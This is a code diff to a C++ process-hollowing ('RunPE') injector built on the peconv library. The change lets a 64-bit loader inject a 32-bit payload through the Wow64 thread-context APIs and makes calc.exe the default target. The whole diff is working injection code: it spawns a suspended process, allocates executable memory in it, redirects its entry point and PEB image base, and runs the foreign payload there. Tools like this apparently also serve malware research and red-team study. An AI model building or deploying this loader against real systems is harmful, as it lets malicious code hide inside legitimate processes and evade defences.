@@ -2,6 +2,9 @@
 
 #include "peconv.h"
 
+// is the injection from 64 bit loader to 32 bit target?
+bool g_is32bit_payload = true;
+
 bool create_new_process(IN LPSTR path, OUT PROCESS_INFORMATION &pi)
 {
     STARTUPINFO si;
@@ -39,35 +42,71 @@ bool read_remote_mem(HANDLE hProcess, ULONGLONG remote_addr, OUT void* buffer, c
     return true;
 }
 
-bool get_remote_context(PROCESS_INFORMATION &pi, CONTEXT &context)
-{
-    memset(&context, 0, sizeof(CONTEXT));
-    context.ContextFlags = CONTEXT_INTEGER;
-    return GetThreadContext(pi.hThread, &context);
-}
-
-bool update_remote_entry_point(PROCESS_INFORMATION &pi, CONTEXT &context, ULONGLONG entry_point_va)
+BOOL update_remote_entry_point(PROCESS_INFORMATION &pi, ULONGLONG entry_point_va)
 {
 #ifdef _DEBUG
     printf("Writing new EP: %x\n", entry_point_va);
 #endif
 
 #if defined(_WIN64)
+    if (g_is32bit_payload) {
+        printf("Payload is 32 bit, using Wow64:\n");
+        //get initial context of the target:
+        WOW64_CONTEXT context = { 0 };
+        context.ContextFlags = CONTEXT_INTEGER;
+        if (!Wow64GetThreadContext(pi.hThread, &context)) {
+            printf("Wow64 cannot get context!\n");
+            return FALSE;
+        }
+        // set new Entry Point in the context:
+        context.Eax = static_cast<DWORD>(entry_point_va);
+
+        // set the changed context back to the target:
+        printf("Trying to set Wow64 context:\n");
+        if (!Wow64SetThreadContext(pi.hThread, &context)) {
+            printf("Wow64 cannot set context!\n");
+            return FALSE;
+        }
+        return TRUE;
+    }
+#endif
+    CONTEXT context = { 0 };
+    context.ContextFlags = CONTEXT_INTEGER;
+    if (!GetThreadContext(pi.hThread, &context)) {
+        return FALSE;
+    }
+#if defined(_WIN64)
     context.Rcx = entry_point_va;
 #else
     context.Eax = static_cast<DWORD>(entry_point_va);
 #endif
-    if (SetThreadContext(pi.hThread, &context)) {
-        return true;
-    }
-    DWORD last_err = GetLastError();
-    printf("last err: %d %x\n", last_err, last_err);
-    return false;
+    return SetThreadContext(pi.hThread, &context);
 }
 
-ULONGLONG get_remote_peb_addr(const CONTEXT &context)
+ULONGLONG get_remote_peb_addr(PROCESS_INFORMATION &pi)
 {
+    BOOL is_ok = FALSE;
+#if defined(_WIN64)
+    if (g_is32bit_payload) {
+        //get initial context of the target:
+        WOW64_CONTEXT context;
+        memset(&context, 0, sizeof(WOW64_CONTEXT));
+        context.ContextFlags = CONTEXT_INTEGER;
+        if (!Wow64GetThreadContext(pi.hThread, &context)) {
+            printf("Wow64 cannot get context!\n");
+            return 0;
+        }
+        //get remote PEB from the context
+        return static_cast<ULONGLONG>(context.Ebx);
+    }
+#endif
     ULONGLONG PEB_addr = 0;
+    CONTEXT context;
+    memset(&context, 0, sizeof(CONTEXT));
+    context.ContextFlags = CONTEXT_INTEGER;
+    if (!GetThreadContext(pi.hThread, &context)) {
+        return 0;
+    }
 #if defined(_WIN64)
     PEB_addr = context.Rdx;
 #else
@@ -76,19 +115,19 @@ ULONGLONG get_remote_peb_addr(const CONTEXT &context)
     return PEB_addr;
 }
 
-bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi, CONTEXT &context)
+bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &pi)
 {
     //1. Calculate VA of the payload's EntryPoint
     DWORD ep = get_entry_point_rva(loaded_pe);
     ULONGLONG ep_va = (ULONGLONG)load_base + ep;
 
     //2. Write the new Entry Point into context of the remote process:
-    if (!update_remote_entry_point(pi, context, ep_va)) {
+    if (update_remote_entry_point(pi, ep_va) == FALSE) {
         printf("Cannot update remote EP!\n");
         return false;
     }
     //3. Get access to the remote PEB:
-    ULONGLONG remote_peb_addr = get_remote_peb_addr(context);
+    ULONGLONG remote_peb_addr = get_remote_peb_addr(pi);
     if (!remote_peb_addr) {
         printf("Failed getting remote PEB address!\n");
         return false;
@@ -117,13 +156,6 @@ bool redirect_to_payload(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION &
 bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi)
 {
     if (loaded_pe == NULL) return false;
-
-    //1. Get the context of the suspended process:
-    CONTEXT context = { 0 };
-    if (!get_remote_context(pi, context)) {
-        printf("Getting remote context failed!\n");
-        return false;
-    }
 
     //2. Allocate memory for the payload in the remote process:
     LPVOID remoteBase = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -157,7 +189,7 @@ bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi)
     printf("Loaded at: %p\n", loaded_pe);
 #endif
     //7. Redirect the remote structures to the injected payload (EntryPoint and ImageBase must be changed):
-    if (!redirect_to_payload(loaded_pe, remoteBase, pi, context)) {
+    if (!redirect_to_payload(loaded_pe, remoteBase, pi)) {
         printf("Redirecting failed!\n");
         return false;
     }
@@ -166,22 +198,42 @@ bool _run_pe(BYTE *loaded_pe, size_t payloadImageSize, PROCESS_INFORMATION &pi)
     return true;
 }
 
+/**
+Checks if the given payload can be injected from current loader.
+Sets the global flag: g_is32bit_payload
+*/
 bool is_bitness_compatibile(BYTE* loaded_pe)
 {
     WORD arch = get_pe_architecture(loaded_pe);
-#ifndef _WIN64
+#ifdef _WIN64
+    if (arch == IMAGE_FILE_MACHINE_I386) {
+        g_is32bit_payload = true;
+        printf("Injecting 32 bit payload from 64 bit loader...\n");
+        return true;
+    } else {
+        g_is32bit_payload = false;
+    }
+#else
     if (arch == IMAGE_FILE_MACHINE_AMD64) {
         printf("Incompatibile payload architecture!\n");
         printf("Only 32 bit payloads can be injected from 32bit loader!\n");
         return false;
-    }
-#else
-    if (arch == IMAGE_FILE_MACHINE_I386) {
-        printf("Incompatibile payload architecture!\n");
-        printf("Injecting 32 bit payload from 64 bit loader is possible, but currently not implemented!\n");
-        return false;
+    } else {
+        g_is32bit_payload = true;
     }
 #endif
+    return true;
+}
+
+bool get_calc_path(LPSTR lpOutPath, DWORD szOutPath, bool is_payload_32b)
+{
+#if defined(_WIN64)
+    if (is_payload_32b) {
+        ExpandEnvironmentStrings("%SystemRoot%\\SysWoW64\\calc.exe", lpOutPath, szOutPath);
+        return true;
+    }
+#endif
+    ExpandEnvironmentStrings("%SystemRoot%\\system32\\calc.exe", lpOutPath, szOutPath);
     return true;
 }
 
@@ -195,11 +247,17 @@ bool run_pe(char *payloadPath, char *targetPath)
         printf("Loading failed!\n");
         return false;
     }
-
+    
     //Check payload archtecture
     if (!is_bitness_compatibile(loaded_pe)) {
         free_pe_module(loaded_pe, payloadImageSize);
         return false;
+    }
+    // Make target path, if none supplied:
+    char calc_path[MAX_PATH] = { 0 };
+    get_calc_path(calc_path, MAX_PATH, g_is32bit_payload);
+    if (targetPath == NULL) {
+        targetPath = calc_path;
     }
 
     //2. Create the target process (suspended):
